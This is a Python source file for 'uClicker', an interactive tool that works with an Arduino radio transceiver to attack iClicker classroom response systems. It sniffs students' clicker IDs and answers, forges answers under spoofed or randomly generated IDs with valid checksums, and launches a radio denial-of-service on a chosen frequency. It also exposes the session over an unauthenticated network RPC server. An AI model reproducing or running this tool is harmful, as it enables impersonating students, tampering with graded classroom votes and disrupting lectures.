from time import sleep
import serial
import threading
import sys
import argparse
import random
import zerorpc
import struct


class DummySerial():
    def write(self, x):
        pass


class Question():
    '''
    Holds all captured information
    for a single iClicker question
    '''

    def __init__(self):
        # set up map from iclicker_id -> current_answer
        self.map_id_answer = {}
        # maps from answer string to current total
        self.map_answer_total = {
            'A': 0,
            'B': 0,
            'C': 0,
            'D': 0,
            'E': 0
        }
        # queue which stores most recent iclicker ids
        self.sender_list = []

    def register_sender(self, iclicker_id):
        '''
        Takes in an iclicker_id and moves it to top of sender list
        to maintain most recently active iclickers
        '''
        # try to remove if present
        try:
            self.sender_list.remove(iclicker_id)
        except:
            pass
        # add iclicker id to top of list
        self.sender_list.append(iclicker_id)

    def save_message(self, iclicker_message):
        '''
        Processes an incoming iClicker message
        if it exists.
        '''
        if iclicker_message is not None:
            answer, iclicker_id = iclicker_message
            # remove previous answer
            if iclicker_id in self.map_id_answer:
                prev_answer = self.map_id_answer[iclicker_id]
                self.map_answer_total[prev_answer] -= 1
            # add to total of current answer
            self.map_answer_total[answer] += 1
            self.map_id_answer[iclicker_id] = answer

            # add the iclicker to top of sender list
            self.register_sender(iclicker_id)

    def get_ids(self, limit=None):
        '''
        if limit is not provided the function will return all available ids
        Returns <limit> number of ids ordered by most recent submission
        '''
        length = len(self.sender_list)
        if limit is None:
            limit = length
        return self.sender_list[length - limit:length]

    def ans(self):
        '''
        Prints a summary of iClicker answers
        collected so far.
        '''
        for k in sorted(self.map_answer_total):
            print(k, self.map_answer_total[k])


class Session():
    '''
    Runs a uClicker session
    with interactive prompt
    '''
    ERR = 'Invalid command'

    def __init__(self, port):
        '''
        Initializes the session and
        connects to the transceiver if port is given.
        '''

        # Information captured for each iClicker question
        self.questions = [Question()]
        # Recently captured keyboard input
        self.next_cmd = None
        # Recently captured iClicker message
        self.next_msg = None
        # Mutex for questions data
        self.questions_mutex = threading.Lock()

        # Establish connection to Arduino transceiver
        if port is None:
            print('No port given, running in test mode')
            self.ser = DummySerial()
        else:
            self.ser = serial.Serial(port, 115200)
            threading.Thread(target=self.iclicker_listener,
                             daemon=True).start()

        # Start listening to keyboard
        threading.Thread(target=self.keyboard_listener, daemon=True).start()

    def loop(self):
        '''
        Main loop
        '''
        while True:
            self.check_keyboard()
            self.check_iclicker()
            sleep(.01)

    def check_iclicker(self):
        '''
        Checks for an incoming iClicker message
        and passes it to the current Question
        '''
        if self.next_msg is not None:
            iclicker_message = self.next_msg

            self.questions_mutex.acquire()
            self.questions[-1].save_message(iclicker_message)
            self.questions_mutex.release()

            # Restart iClicker listener
            self.next_msg = None
            threading.Thread(target=self.iclicker_listener,
                             daemon=True).start()

    def check_keyboard(self):
        '''
        Processes keyboard input
        if any has been captured.
        '''
        if self.next_cmd is not None:
            self.execute_cmd(self.next_cmd)
            # Restart keyboard listener
            self.next_cmd = None
            threading.Thread(target=self.keyboard_listener,
                             daemon=True).start()

    def execute_cmd(self, cmdstring):
        '''
        Parses commands from interactive prompt
        and calls the corresponding function.
        '''
        tokens = cmdstring.split()

        if tokens[0] == 'quit' or tokens[0] == 'exit':
            sys.exit(0)
        elif tokens[0] == 'reset':
            self.reset()
        elif tokens[0] == 'ans':
            self.ans()
        elif tokens[0] == 'ids':
            if len(tokens) >= 2:
                if tokens[1].isdigit():
                    self.ids(int(tokens[1]))
                else:
                    print(self.ERR)
            else:
                self.ids()
        elif tokens[0] == 'freq':
            if len(tokens) >= 2 and self.validate_freq(tokens[1].upper()):
                self.freq(tokens[1].upper())
            else:
                print(self.ERR)
        elif tokens[0] == 'send':
            if len(tokens) >= 3 and self.validate_send(tokens[1], tokens[2].upper()):
                self.send(tokens[1], tokens[2].upper())
            else:
                print(self.ERR)
        elif tokens[0] == 'startdos':
            self.startdos()
        elif tokens[0] == 'stopdos':
            self.stopdos()
        elif tokens[0] == 'gen':
            print(self.generate_id())
        else:
            print(self.ERR)

    def freq(self, freqchoice):
        '''
        Changes the iClicker frequency to attack on.

        :param freqchoice: choice of frequencies in 2 capital letters [A-D]
        :return:
        '''
        # action code
        send_str = b''
        send_str += struct.pack('>B', 98)
        for x in range(2):
            send_str += struct.pack('>B', ord(freqchoice[x]))
        for x in range(5):
            send_str += struct.pack('>B', 97)
        self.ser.write(send_str)

    def startdos(self):
        '''
        Starts a DOS attack by spamming iClicker messages.
        '''
        self.ser.write('cccccccc'.encode())

    def stopdos(self):
        '''
        Halts a DOS attack started earlier.
        '''
        self.ser.write('dddddddd'.encode())

    def send(self, iclicker_id, choice):
        '''
        Send choice to base using alias iclicker_id.
        :param iclicker_id: 8 digit hex string
        :param choice: letter of choice [A, E] USE CAPITALS!!!
        :return: nothing
        '''
        send_str = b''
        # action code
        send_str += struct.pack('>B', 97)
        # self.ser.write(chr(97).encode())
        # iclicker id
        for x in range(4):
            fragment = iclicker_id[(2*x):(2*(x+1))]
            char_representation = struct.pack('>B', int(fragment, 16))
            send_str += char_representation
        num_choice = ord(choice) - 65
        # answer choice
        send_str += struct.pack('>B', num_choice)
        # fill in the rest of the bytes for 8 byte format
        for x in range(2):
            send_str += struct.pack('>B', 97)
        self.ser.write(send_str)

    def reset(self):
        '''
        Move on to a new Question
        '''
        self.questions_mutex.acquire()
        self.questions.append(Question())
        self.questions_mutex.release()

    def ans(self):
        '''
        Prints the captured answers for the current question
        '''
        self.questions_mutex.acquire()
        self.questions[-1].ans()
        self.questions_mutex.release()

    def ids(self, limit=None):
        '''
        Prints the captured iClicker IDs for the current question
        '''
        self.questions_mutex.acquire()
        ids = self.questions[-1].get_ids(limit)
        self.questions_mutex.release()

        for id in ids:
            print(id)

    def keyboard_listener(self):
        '''
        Waits for keyboard input.
        Should be in its own thread.
        '''
        try:
            self.next_cmd = input('(uclicker)> ')
        except EOFError:
            print()
            self.next_cmd = 'quit'

    def iclicker_listener(self):
        '''
        Waits for iClicker messages.
        Should be in its own thread.
        '''
        while self.next_msg is None:
            self.next_msg = self.parse_message(self.ser.readline())

    @staticmethod
    def parse_message(serial_msg):
        '''
        Takes in serial input from arduino
        Returns: (<answer>, <iclicker_id>) or None if bad message
        '''
        string_msg = serial_msg.decode('utf-8').strip()
        if string_msg != '':
            # parse out the string message
            try:
                answer, iclicker_id = string_msg.split(':')
                return (answer, iclicker_id)
            except:
                return None
        return None

    @staticmethod
    def generate_id():
        '''
        Generates a random iClicker ID.
        iClicker IDs are 4 bytes in hexadecimal,
        where the last byte is an XOR checksum of the first three.
        '''
        def x(i):
            return (hex(i)[2:]).upper().zfill(2)

        b1 = random.randint(0, 255)
        b2 = random.randint(0, 255)
        b3 = random.randint(0, 255)
        b4 = b1 ^ b2 ^ b3
        return ' '.join([x(i) for i in [b1, b2, b3, b4]])

    @staticmethod
    def validate_freq(f):
        '''
        Validates that a given frequency
        is 2 letters of [A-D]
        '''
        if len(f) != 2:
            return False
        if f[0] < 'A' or f[0] > 'D':
            return False
        if f[1] < 'A' or f[1] > 'D':
            return False
        return True

    @staticmethod
    def validate_send(id, choice):
        '''
        Valides the arguments for send
        '''
        if len(choice) != 1 or choice < 'A' or choice > 'E':
            return False

        if len(id) != 8:
            return False

        id_bytes = []
        try:
            for i in range(0, 8, 2):
                b = int(id[i:i+2], 16)
                id_bytes.append(b)
        except ValueError:
            return False

        if id_bytes[3] != (id_bytes[0] ^ id_bytes[1] ^ id_bytes[2]):
            return False

        return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    args = parser.parse_args()

    session = Session(args.port)
    session.loop()

    server = zerorpc.Server(session)
    server.bind('tcp://0.0.0.0:4545')
    server.run()
